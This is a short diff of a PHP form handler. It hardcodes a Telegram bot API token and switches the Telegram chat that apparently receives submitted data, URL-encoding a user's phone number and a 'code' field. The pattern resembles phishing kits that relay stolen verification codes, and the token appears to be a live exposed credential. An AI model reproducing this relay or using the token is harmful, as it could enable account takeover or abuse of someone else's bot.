@@ -17,8 +17,8 @@ if ($_POST) {
 
    
     $token = "7112590922:AAEkTRN4YWw5TJ3nI5f_n9xJqK-YIJEt46I"; // api телеграм бота
-    // $chat_id = "-1002230652746";
-    $chat_id = "1483953355";
+    $chat_id = "-1002230652746";
+    // $chat_id = "1483953355";
 
     $code = urlencode("$code");
     $userPhone = urlencode("$userPhone");
